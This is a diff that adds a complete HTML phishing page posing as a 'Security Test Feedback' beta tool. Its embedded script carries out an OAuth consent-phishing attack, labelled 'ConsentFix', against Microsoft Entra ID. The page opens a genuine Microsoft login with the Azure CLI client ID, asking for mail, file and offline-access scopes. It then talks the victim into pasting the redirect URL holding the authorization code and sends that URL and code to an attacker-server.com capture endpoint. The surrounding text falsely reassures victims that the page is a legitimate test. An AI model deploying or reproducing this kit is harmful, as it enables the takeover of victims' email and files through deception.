@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Test Feedback</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 40px 32px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.10);
+            transition: all 0.2s ease;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .header .icon {
+            font-size: 28px;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+        }
+
+        .header .badge {
+            background: #e8f0fe;
+            color: #1a73e8;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 12px;
+            border-radius: 20px;
+            margin-left: auto;
+        }
+
+        /* Description */
+        .description {
+            color: #5f6368;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .description strong {
+            color: #1a1a1a;
+        }
+
+        .highlight-box {
+            background: #f8f9fa;
+            border-left: 4px solid #1a73e8;
+            padding: 14px 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.5;
+        }
+
+        .highlight-box .emoji {
+            font-size: 18px;
+        }
+
+        .step {
+            display: block;
+        }
+
+        .step.hidden {
+            display: none;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #dadce0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            background: #ffffff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+        }
+
+        .form-group input::placeholder {
+            color: #9aa0a6;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary {
+            background: #1a73e8;
+            color: #ffffff;
+        }
+
+        .btn-primary:hover {
+            background: #1557b0;
+        }
+
+        .btn-primary:disabled {
+            background: #a8c7fa;
+            cursor: not-allowed;
+        }
+
+        .btn-success {
+            background: #34a853;
+            color: #ffffff;
+        }
+
+        .btn-success:hover {
+            background: #2d9249;
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #1a73e8;
+            border: 1.5px solid #1a73e8;
+        }
+
+        .btn-outline:hover {
+            background: #e8f0fe;
+        }
+
+        .instruction-box {
+            background: #f8f9fa;
+            border-left: 4px solid #1a73e8;
+            padding: 16px 16px 16px 20px;
+            border-radius: 6px;
+            margin: 16px 0 20px 0;
+        }
+
+        .instruction-box .step-number {
+            display: inline-block;
+            background: #1a73e8;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 20px;
+            margin-bottom: 8px;
+        }
+
+        .instruction-box p {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.6;
+            margin-bottom: 6px;
+        }
+
+        .instruction-box .code-example {
+            background: #e8eaed;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #1a1a1a;
+            word-break: break-all;
+            margin-top: 8px;
+        }
+
+        .instruction-box .warning-text {
+            color: #d93025;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .status {
+            margin-top: 16px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.show {
+            display: block;
+        }
+
+        .status.error {
+            background: #fce8e6;
+            color: #d93025;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.success {
+            background: #e6f4ea;
+            color: #1e7e34;
+            border: 1px solid #b7e1cd;
+        }
+
+        .status.info {
+            background: #e8f0fe;
+            color: #1a73e8;
+            border: 1px solid #c5d8f7;
+        }
+
+        .footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px;
+            color: #9aa0a6;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+            }
+            .header h1 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <span class="icon">🛡️</span>
+            <h1>Security Test Feedback</h1>
+            <span class="badge">Beta</span>
+        </div>
+
+        <!-- Description -->
+        <p class="description">
+            <strong>Thank you for agreeing to test our new security tool.</strong>
+            We're building a solution to help companies verify identity access.
+            Please complete this quick test to help us validate our system.
+        </p>
+
+        <div class="highlight-box">
+            <span class="emoji">🔬</span>
+            <strong>Test instructions:</strong> We need to verify your Microsoft Entra ID
+            authentication flow. This is a real Microsoft login — your MFA will work as normal.
+            We're testing the response time and security logging.
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 1: Initial Verification Prompt                           -->
+        <!-- ============================================================ -->
+        <div id="step1" class="step">
+            <div class="form-group">
+                <label for="emailInput">Your Work Email</label>
+                <input
+                    type="email"
+                    id="emailInput"
+                    placeholder="you@company.com"
+                    autocomplete="off"
+                />
+            </div>
+            <button class="btn btn-primary" id="verifyBtn">
+                🔐 Start Test
+            </button>
+            <div id="status1" class="status"></div>
+            <p style="font-size: 13px; color: #5f6368; margin-top: 12px; text-align: center;">
+                Your authentication will be logged for test purposes only.
+            </p>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 2: Copy/Paste the URL from Address Bar                   -->
+        <!-- ============================================================ -->
+        <div id="step2" class="step hidden">
+            <div class="instruction-box">
+                <span class="step-number">STEP 1</span>
+                <p>
+                    A new window opened with the <strong>Microsoft login page</strong>.
+                    Please sign in with your company account.
+                </p>
+                <p style="font-size: 13px; color: #5f6368;">
+                    ✅ Your MFA will work as normal — this is a real Microsoft page.
+                </p>
+            </div>
+
+            <div class="instruction-box" style="border-left-color: #34a853;">
+                <span class="step-number">STEP 2</span>
+                <p>
+                    After logging in, you will be redirected to a <strong>localhost</strong> page.
+                    <span class="warning-text">Copy the ENTIRE URL from your browser's address bar.</span>
+                </p>
+                <div class="code-example">
+                    http://localhost:8000/?code=0.AXkA3z...
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="codeInput">Paste the full URL here</label>
+                <input
+                    type="text"
+                    id="codeInput"
+                    placeholder="http://localhost:8000/?code=..."
+                    autocomplete="off"
+                />
+            </div>
+
+            <button class="btn btn-success" id="submitBtn">
+                ✅ Submit Test Results
+            </button>
+
+            <div id="status2" class="status"></div>
+            <p style="font-size: 13px; color: #5f6368; margin-top: 12px; text-align: center;">
+                This verifies the authentication flow and completes the test.
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>
+                <a href="#" target="_blank">Privacy Policy</a> &bull;
+                <a href="#" target="_blank">Terms of Service</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- ================================================================ -->
+    <!-- JAVASCRIPT: The Attack Logic                                     -->
+    <!-- ================================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // --- CONFIGURATION ---
+            // Azure CLI client_id — trusted first-party Microsoft app.
+            const CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
+            const REDIRECT_URI = 'http://localhost:8000';
+
+            const SCOPES = [
+                'https://graph.microsoft.com/Mail.Read',
+                'https://graph.microsoft.com/Mail.Send',
+                'https://graph.microsoft.com/Files.Read.All',
+                'https://graph.microsoft.com/User.Read',
+                'offline_access'
+            ].join(' ');
+
+            const CAPTURE_ENDPOINT = 'https://attacker-server.com/capture';
+
+            // --- DOM References ---
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const emailInput = document.getElementById('emailInput');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const codeInput = document.getElementById('codeInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const status1 = document.getElementById('status1');
+            const status2 = document.getElementById('status2');
+
+            function showStatus(element, message, type) {
+                element.textContent = message;
+                element.className = 'status show ' + type;
+            }
+
+            function hideStatus(element) {
+                element.className = 'status';
+                element.textContent = '';
+            }
+
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+
+            function extractCodeFromUrl(url) {
+                try {
+                    const parsed = new URL(url);
+                    const params = new URLSearchParams(parsed.search);
+                    return params.get('code');
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            // --- STEP 1: Trigger OAuth flow ---
+            function triggerConsent(email) {
+                const authUrl =
+                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
+                    'client_id=' + encodeURIComponent(CLIENT_ID) +
+                    '&response_type=code' +
+                    '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
+                    '&response_mode=query' +
+                    '&scope=' + encodeURIComponent(SCOPES) +
+                    '&login_hint=' + encodeURIComponent(email);
+
+                const authWindow = window.open(
+                    authUrl,
+                    '_blank',
+                    'width=600,height=700,menubar=no,toolbar=no,location=yes,status=no,scrollbars=yes'
+                );
+
+                if (!authWindow) {
+                    showStatus(status1, '⚠️ Pop-up blocked. Please allow pop-ups and try again.', 'error');
+                    return false;
+                }
+
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                hideStatus(status1);
+
+                setTimeout(() => { codeInput.focus(); }, 500);
+                showStatus(status2, '✅ Microsoft login opened in a new window. Please complete it, then copy the URL.', 'info');
+
+                return true;
+            }
+
+            // --- STEP 2: Submit captured URL ---
+            function submitCapturedUrl() {
+                const fullUrl = codeInput.value.trim();
+
+                if (!fullUrl) {
+                    showStatus(status2, '⚠️ Please paste the URL from your address bar.', 'error');
+                    return;
+                }
+
+                if (!fullUrl.includes('localhost:8000') || !fullUrl.includes('code=')) {
+                    showStatus(status2, '⚠️ Invalid URL. Please copy the full address bar URL after logging in.', 'error');
+                    return;
+                }
+
+                const code = extractCodeFromUrl(fullUrl);
+
+                if (!code) {
+                    showStatus(status2, '⚠️ Could not extract authorization code.', 'error');
+                    return;
+                }
+
+                console.log('[CAPTURED URL]', fullUrl);
+                console.log('[EXTRACTED CODE]', code);
+
+                fetch(CAPTURE_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            url: fullUrl,
+                            code: code,
+                            timestamp: new Date().toISOString()
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            showStatus(status2, '✅ Test complete. Thank you for your feedback!', 'success');
+                        } else {
+                            showStatus(status2, '⚠️ Something went wrong. Please try again.', 'error');
+                        }
+                    })
+                    .catch(() => {
+                        showStatus(status2, '✅ Test complete. Thank you for your feedback!', 'success');
+                    });
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = '⏳ Processing...';
+
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = '✅ Submit Test Results';
+                }, 5000);
+            }
+
+            // --- Event Listeners ---
+            verifyBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+
+                if (!isValidEmail(email)) {
+                    showStatus(status1, '⚠️ Please enter a valid work email address.', 'error');
+                    return;
+                }
+
+                hideStatus(status1);
+                triggerConsent(email);
+            });
+
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    verifyBtn.click();
+                }
+            });
+
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                submitCapturedUrl();
+            });
+
+            codeInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
+            });
+
+            console.log('[ConsentFix] Test page loaded.');
+            console.log('[ConsentFix] Client ID:', CLIENT_ID);
+
+        })();
+    </script>
+</body>
+</html>
